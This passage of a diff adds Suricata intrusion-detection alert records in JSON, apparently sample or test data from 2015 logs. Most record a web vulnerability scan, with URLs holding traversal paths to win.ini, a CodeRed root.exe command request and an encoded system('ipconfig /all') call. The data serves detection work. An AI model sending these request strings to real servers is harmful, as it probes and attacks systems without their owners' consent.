+      "pkts_toserver": 64,
+      "pkts_toclient": 87,
+      "bytes_toserver": 14502,
+      "bytes_toclient": 93800,
+      "start": "2015-03-17T02:16:28.133581-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:18:22.459631-0600",
+    "flow_id": 91366357916382,
+    "pcap_cnt": 149395,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 38604,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101013,
+      "rev": 11,
+      "signature": "GPL EXPLOIT fpcount access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/_vti_bin/fpcount.exe",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 218
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 596,
+      "bytes_toclient": 651,
+      "start": "2015-03-17T02:18:22.187102-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:19:32.839817-0600",
+    "flow_id": 408291999269561,
+    "pcap_cnt": 152511,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 40894,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101016,
+      "rev": 15,
+      "signature": "GPL WEB_SERVER global.asa access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 262
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 644,
+      "bytes_toclient": 695,
+      "start": "2015-03-17T02:19:32.574137-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:22:26.369465-0600",
+    "flow_id": 1611003112621508,
+    "pcap_cnt": 158872,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 45791,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101018,
+      "rev": 12,
+      "signature": "GPL EXPLOIT iisadmpwd attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/iisadmpwd/aexp.htr",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 594,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:22:26.099780-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:19:31.179726-0600",
+    "flow_id": 2035410294462176,
+    "pcap_cnt": 152345,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 40860,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101055,
+      "rev": 12,
+      "signature": "GPL WEB_SERVER Tomcat directory traversal attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/\\0.jsp",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 581,
+      "bytes_toclient": 690,
+      "start": "2015-03-17T02:19:30.906976-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:19:29.430235-0600",
+    "flow_id": 1923629475525386,
+    "pcap_cnt": 152233,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 40831,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101108,
+      "rev": 13,
+      "signature": "GPL WEB_SERVER Tomcat server snoop access",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/examples/jsp/snp/anything.snp",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 227
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 643,
+      "bytes_toclient": 660,
+      "start": "2015-03-17T02:19:29.160522-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:22:00.306902-0600",
+    "flow_id": 1677051117900087,
+    "pcap_cnt": 158091,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 45331,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101129,
+      "rev": 8,
+      "signature": "GPL WEB_SERVER .htaccess access",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/.htaccess.old",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 403,
+      "length": 215
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 589,
+      "bytes_toclient": 648,
+      "start": "2015-03-17T02:21:59.987447-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:21:10.429767-0600",
+    "flow_id": 1474972903437500,
+    "pcap_cnt": 155855,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 42593,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101145,
+      "rev": 10,
+      "signature": "GPL WEB_SERVER /~root access",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/~root",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 203
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 581,
+      "bytes_toclient": 636,
+      "start": "2015-03-17T02:21:10.160956-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-27T12:23:05.279430-0600",
+    "flow_id": 178527248239204,
+    "event_type": "alert",
+    "src_ip": "192.168.0.2",
+    "src_port": 80,
+    "dest_ip": "94.243.223.7",
+    "dest_port": 60384,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101201,
+      "rev": 10,
+      "signature": "GPL WEB_SERVER 403 Forbidden",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "95.192.4.248",
+      "url": "/phpMyAdmin/scripts/setup.php",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 403,
+      "length": 230
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 397,
+      "bytes_toclient": 660,
+      "start": "2015-03-27T12:11:02.641636-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:18:50.147111-0600",
+    "flow_id": 1578769368821096,
+    "pcap_cnt": 150757,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 39778,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101242,
+      "rev": 13,
+      "signature": "GPL EXPLOIT ISAPI .ida access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/NULL.ida",
+      "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 206
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 564,
+      "bytes_toclient": 668,
+      "start": "2015-03-17T02:18:49.863592-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:43.985923-0600",
+    "flow_id": 104551928556370,
+    "pcap_cnt": 165173,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47536,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101243,
+      "rev": 13,
+      "signature": "GPL EXPLOIT ISAPI .ida attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/x.ida?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=x",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 203
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 565,
+      "bytes_toclient": 580,
+      "start": "2015-03-17T02:23:43.715602-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:33.440800-0600",
+    "flow_id": 2090411634041539,
+    "pcap_cnt": 144864,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59325,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101244,
+      "rev": 16,
+      "signature": "GPL EXPLOIT ISAPI .idq attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/query.idq?CiTemplate=../../../../../winnt/win.ini",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 625,
+      "bytes_toclient": 640,
+      "start": "2015-03-17T02:16:33.172739-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:33.440800-0600",
+    "flow_id": 2090411634041539,
+    "pcap_cnt": 144864,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59325,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/query.idq?CiTemplate=../../../../../winnt/win.ini",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 625,
+      "bytes_toclient": 640,
+      "start": "2015-03-17T02:16:33.172739-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101245,
+      "rev": 12,
+      "signature": "GPL EXPLOIT ISAPI .idq access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:46.381710-0600",
+    "flow_id": 112682274291544,
+    "pcap_cnt": 145476,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59888,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101256,
+      "rev": 10,
+      "signature": "GPL EXPLOIT CodeRed v2 root.exe access",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/root.exe?/c+dir+c:\\+/OG",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 214
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 607,
+      "bytes_toclient": 647,
+      "start": "2015-03-17T02:16:46.098136-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:33.795180-0600",
+    "flow_id": 1754502241454541,
+    "pcap_cnt": 144878,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59138,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 32,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101402,
+      "rev": 8,
+      "signature": "GPL EXPLOIT iissamples access",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/iissamples/",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 65,
+      "pkts_toclient": 88,
+      "bytes_toserver": 14878,
+      "bytes_toclient": 94301,
+      "start": "2015-03-17T02:16:28.133581-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:08.072263-0600",
+    "flow_id": 997363957836777,
+    "pcap_cnt": 160966,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 46615,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101403,
+      "rev": 11,
+      "signature": "GPL WEB_SERVER viewcode access",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 212
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 690,
+      "bytes_toclient": 645,
+      "start": "2015-03-17T02:23:07.797673-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:22:26.547334-0600",
+    "flow_id": 1611003112621508,
+    "pcap_cnt": 158875,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 45791,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/iisadmpwd/aexp2.htr",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 217
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 4,
+      "bytes_toserver": 1373,
+      "bytes_toclient": 1158,
+      "start": "2015-03-17T02:22:26.099780-0600"
+    },
+    "tx_id": 1,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101487,
+      "rev": 12,
+      "signature": "GPL EXPLOIT /iisadmpwd/aexp2.htr access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:48.079266-0600",
+    "flow_id": 1556452710492630,
+    "pcap_cnt": 145648,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59781,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 27,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101874,
+      "rev": 5,
+      "signature": "GPL WEB_SERVER Oracle Java Process Manager access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/oprocmgr-status/",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 214
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 32,
+      "pkts_toclient": 30,
+      "bytes_toserver": 11190,
+      "bytes_toclient": 14108,
+      "start": "2015-03-17T02:16:43.993750-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:17:37.814242-0600",
+    "flow_id": 682684567324245,
+    "pcap_cnt": 148184,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 35744,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101877,
+      "rev": 10,
+      "signature": "GPL WEB_SERVER printenv access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/cgi-bin-sdb/printenv",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 218
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 596,
+      "bytes_toclient": 651,
+      "start": "2015-03-17T02:17:37.525909-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:20:25.771510-0600",
+    "flow_id": 1500360452189195,
+    "pcap_cnt": 154410,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 41821,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2101979,
+      "rev": 6,
+      "signature": "GPL WEB_SERVER perl post attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/perl/",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 203
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 463,
+      "bytes_toclient": 580,
+      "start": "2015-03-17T02:20:25.502795-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:19:31.179726-0600",
+    "flow_id": 2035410294462176,
+    "pcap_cnt": 152345,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 40860,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/\\0.jsp",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 581,
+      "bytes_toclient": 690,
+      "start": "2015-03-17T02:19:30.906976-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2102061,
+      "rev": 6,
+      "signature": "GPL WEB_SERVER Tomcat null byte directory listing attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:22:13.263555-0600",
+    "flow_id": 1198647596610635,
+    "pcap_cnt": 158584,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 45555,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2102156,
+      "rev": 4,
+      "signature": "GPL WEB_SERVER mod_gzip_status access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/mod_gzip_status",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 213
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 591,
+      "bytes_toclient": 646,
+      "start": "2015-03-17T02:22:12.980043-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-09T03:21:01.184624-0600",
+    "flow_id": 938722647523466,
+    "pcap_cnt": 26472,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 52328,
+    "dest_ip": "37.59.31.55",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 1,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221001,
+      "rev": 1,
+      "signature": "SURICATA HTTP gzip decompression failed",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "wall4all.me",
+      "url": "/thumbs/cartoon-comics/krusty-the-clown-the-simpsons-1021745-480x320.gif",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36",
+      "http_content_type": "image/gif",
+      "http_refer": "http://wall4all.me/wallpaper/1021745-the-Clown-The-Simpsons",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 206,
+      "length": 2279
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 7,
+      "pkts_toclient": 8,
+      "bytes_toserver": 1536,
+      "bytes_toclient": 6584,
+      "start": "2015-03-09T03:20:50.114826-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-09T20:23:20.548094-0600",
+    "flow_id": 1704825862247669,
+    "pcap_cnt": 19180,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 2936,
+    "dest_ip": "115.241.97.181",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221002,
+      "rev": 1,
+      "signature": "SURICATA HTTP request field missing colon",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "http_content_type": "text/html",
+      "status": 400,
+      "length": 156
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 3
+      }
+    },
+    "app_proto": "http",
+    "app_proto_ts": "failed",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 399,
+      "bytes_toclient": 553,
+      "start": "2015-04-09T20:22:36.283893-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:14:53.016394-0600",
+    "flow_id": 2036411003587187,
+    "pcap_cnt": 139396,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 54899,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 4,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221005,
+      "rev": 1,
+      "signature": "SURICATA HTTP invalid transfer encoding value in request",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/",
+      "http_user_agent": "Mozilla/5.0 Gecko/20081007 Firefox/3.0",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 9,
+      "pkts_toclient": 8,
+      "bytes_toserver": 1821,
+      "bytes_toclient": 3447,
+      "start": "2015-03-17T02:14:52.215667-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-08T07:54:41.410733-0600",
+    "flow_id": 1934671001006650,
+    "event_type": "alert",
+    "src_ip": "85.195.90.199",
+    "src_port": 80,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 3401,
+    "proto": "TCP",
+    "tx_id": 1,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221010,
+      "rev": 1,
+      "signature": "SURICATA HTTP unable to match response to request",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "url": "/libhtp::request_uri_not_seen",
+      "length": 594
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 616,
+      "bytes_toclient": 1307,
+      "start": "2015-04-08T07:48:53.963130-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:24:48.842972-0600",
+    "flow_id": 451898822945454,
+    "pcap_cnt": 174226,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 49158,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221013,
+      "rev": 1,
+      "signature": "SURICATA HTTP request header invalid",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/index.php?op=disp&filedata=c3lzdGVtKCdpcGNvbmZpZyAvYWxsJyk7",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 215
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 662,
+      "bytes_toclient": 648,
+      "start": "2015-03-17T02:24:48.584366-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-27T07:41:31.894611-0600",
+    "flow_id": 689537102278941,
+    "pcap_cnt": 79545,
+    "event_type": "alert",
+    "src_ip": "64.79.50.35",
+    "src_port": 35239,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
